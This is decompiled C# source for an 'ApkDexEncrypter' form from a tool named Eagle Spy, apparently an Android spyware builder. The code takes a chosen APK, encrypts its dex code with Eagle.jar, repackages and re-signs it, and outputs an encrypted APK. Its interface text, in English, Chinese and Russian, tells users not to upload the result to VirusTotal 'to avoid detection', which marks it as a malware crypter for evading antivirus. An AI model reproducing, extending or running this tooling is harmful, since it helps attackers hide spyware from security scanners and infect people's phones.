using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Guna.UI2.WinForms;

namespace Eaglespy
{
	// Token: 0x020000E6 RID: 230
	public partial class ApkDexEncrypter : Form
	{
		// Token: 0x06000B7F RID: 2943 RVA: 0x000FBB70 File Offset: 0x000F9D70
		public ApkDexEncrypter()
		{
			this.InitializeComponent();
			this.ApkFilePath.AllowDrop = true;
		}

		// Token: 0x06000B80 RID: 2944 RVA: 0x000FBBCC File Offset: 0x000F9DCC
		private async Task ExecuteCommandAsync(string command)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c " + command;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.OutputDataReceived += this.OutputHandler;
			process.ErrorDataReceived += this.OutputHandler;
			process.Start();
			process.BeginOutputReadLine();
			process.BeginErrorReadLine();
			await Task.Run(delegate
			{
				process.WaitForExit();
			});
			process.Close();
		}

		// Token: 0x06000B81 RID: 2945 RVA: 0x00007430 File Offset: 0x00005630
		private void OutputHandler(object sender, DataReceivedEventArgs e)
		{
			if (e.Data != null)
			{
				this.AppendTextToRichTextBox(e.Data);
			}
		}

		// Token: 0x06000B82 RID: 2946 RVA: 0x000FBC18 File Offset: 0x000F9E18
		private void AppendTextToRichTextBox(string text)
		{
			if (base.InvokeRequired)
			{
				base.Invoke(new Action<string>(this.AppendTextToRichTextBox), new object[] { text });
				return;
			}
			this.logtext.AppendText(text + "\r\n");
			this.logtext.ScrollToCaret();
		}

		// Token: 0x06000B83 RID: 2947 RVA: 0x000FBC6C File Offset: 0x000F9E6C
		private async void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "APK files (*.apk)|*.apk",
				FilterIndex = 1,
				RestoreDirectory = true
			};
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string selectedFilePath = openFileDialog.FileName;
				this.ApkFilePath.Text = selectedFilePath;
				try
				{
					if (Directory.Exists(this.workdir))
					{
						Directory.Delete(this.workdir, true);
					}
					Directory.CreateDirectory(this.workdir);
					try
					{
						await Task.Run(delegate
						{
							ZipFile.ExtractToDirectory(this.LibZip, this.workdir);
						});
						if (!Directory.Exists(this.workdir))
						{
							Directory.CreateDirectory(this.workdir);
						}
						string fileName = Path.GetFileName(selectedFilePath);
						string text = Path.Combine(this.workdir, "Build.apk");
						File.Copy(selectedFilePath, text, true);
						EagleAlert.ShowSucess("Selected " + fileName);
					}
					catch (Exception)
					{
						EagleAlert.ShowError("Error selecting Apk");
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000B84 RID: 2948 RVA: 0x00007446 File Offset: 0x00005646
		private void CheckBox1_ValueChanged(object sender, bool value)
		{
			if (this.CheckBox1.Checked)
			{
				this.drakeUIAvatar2.ForeColor = Color.Lime;
				return;
			}
			this.drakeUIAvatar2.ForeColor = Color.Maroon;
		}

		// Token: 0x06000B85 RID: 2949 RVA: 0x00007476 File Offset: 0x00005676
		private void CheckBox2_ValueChanged(object sender, bool value)
		{
			if (this.CheckBox2.Checked)
			{
				this.drakeUIAvatar3.ForeColor = Color.Lime;
				return;
			}
			this.drakeUIAvatar3.ForeColor = Color.Maroon;
		}

		// Token: 0x06000B86 RID: 2950 RVA: 0x000FBCA4 File Offset: 0x000F9EA4
		private async void Encryptbutton_Click(object sender, EventArgs e)
		{
			if (this.CheckBox1.Checked)
			{
				string text = Path.Combine(this.workdir, "Build.apk");
				string BuildSign = Path.Combine(this.workdir, "Build_signed.apk");
				string Signedenc = Path.Combine(this.workdir, "Build_Encrypted.apk");
				string Buildfinal = Path.Combine(this.workdir, "Build_Encrypted-aligned-debugSigned.apk");
				try
				{
					if (File.Exists(text))
					{
						this.Encryptbutton.Enabled = false;
						await this.ExecuteCommandAsync("cd " + this.workdir + " && java -jar Eagle.jar -f Build.apk");
					}
					if (File.Exists(BuildSign))
					{
						await this.ExecuteCommandAsync("cd " + this.workdir + " && java -jar APKEditor.jar p -i Build_signed.apk -o Build_Encrypted.apk");
					}
					if (File.Exists(Signedenc))
					{
						await this.ExecuteCommandAsync("cd " + this.workdir + " && java -jar signer.jar -a Build_Encrypted.apk  --allowResign");
					}
					if (File.Exists(Buildfinal))
					{
						await this.ExecuteCommandAsync("cd " + this.workdir + " && move Build_Encrypted-aligned-debugSigned.apk Output\\EncryptedApk.apk");
						this.Encryptbutton.Enabled = true;
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("Error during extraction: " + ex.Message);
				}
				if (this.CheckBox1.Checked)
				{
					this.drakeUIAvatar2.ForeColor = Color.Lime;
				}
				else
				{
					this.drakeUIAvatar3.ForeColor = Color.Maroon;
				}
				if (this.CheckBox2.Checked)
				{
					this.drakeUIAvatar3.ForeColor = Color.Lime;
				}
				string text2 = "C:\\ApkEncrypter\\Work\\Build_Encrypted-aligned-debugSigned.apk";
				string text3 = "C:\\ApkEncrypter\\Output\\Encrypted_Signed.apk";
				string text4 = "C:\\ApkEncrypter\\Output";
				if (Directory.Exists(text4))
				{
					Directory.Delete(text4, true);
				}
				Directory.CreateDirectory(text4);
				File.Move(text2, text3);
				if (Directory.Exists(this.workdir))
				{
					Directory.Delete(this.workdir, true);
				}
				if (File.Exists(text3))
				{
					base.Close();
					Process.Start(text4);
				}
			}
		}

		// Token: 0x06000B87 RID: 2951 RVA: 0x000074A6 File Offset: 0x000056A6
		private void ApkDexEncrypter_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (Directory.Exists(this.workdir))
			{
				Directory.Delete(this.workdir, true);
			}
		}

		// Token: 0x06000B88 RID: 2952 RVA: 0x000FBCDC File Offset: 0x000F9EDC
		private void UpdateEnglish()
		{
			this.label8.Text = "Apk Encrypter";
			this.Encryptbutton.Text = "Start Encryption";
			this.CheckBox1.Text = "Protection Level 1";
			this.CheckBox2.Text = "protection Level 2";
			this.label1.Text = "Warning : Do not upload it to virustotal to avoid detection";
		}

		// Token: 0x06000B89 RID: 2953 RVA: 0x000FBD3C File Offset: 0x000F9F3C
		private void UpdateChinese()
		{
			this.label8.Text = "APK加密工具";
			this.Encryptbutton.Text = "开始加密";
			this.CheckBox1.Text = "保护等级 1";
			this.CheckBox2.Text = "保护等级 2";
			this.label1.Text = "警告：为了避免检测，请不要上传到 VirusTotal";
		}

		// Token: 0x06000B8A RID: 2954 RVA: 0x000FBD9C File Offset: 0x000F9F9C
		private void UpdateRussian()
		{
			this.label8.Text = "Шифровальщик APK";
			this.Encryptbutton.Text = "Начать шифрование";
			this.CheckBox1.Text = "Уровень защиты 1";
			this.CheckBox2.Text = "Уровень защиты 2";
			this.label1.Text = "Предупреждение: Не загружайте его на VirusTotal, чтобы избежать обнаружения";
		}

		// Token: 0x06000B8B RID: 2955 RVA: 0x000FBDFC File Offset: 0x000F9FFC
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x06000B8C RID: 2956 RVA: 0x000074C1 File Offset: 0x000056C1
		private void ApkDexEncrypter_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x04000EBF RID: 3775
		private string LibZip = Application.StartupPath + "\\res\\Library\\classes3.bin";

		// Token: 0x04000EC0 RID: 3776
		private string Apkzip = Application.StartupPath + "\\res\\Library\\temp.zip";

		// Token: 0x04000EC1 RID: 3777
		private string workdir = "C:\\ApkEncrypter\\Work";
	}
}
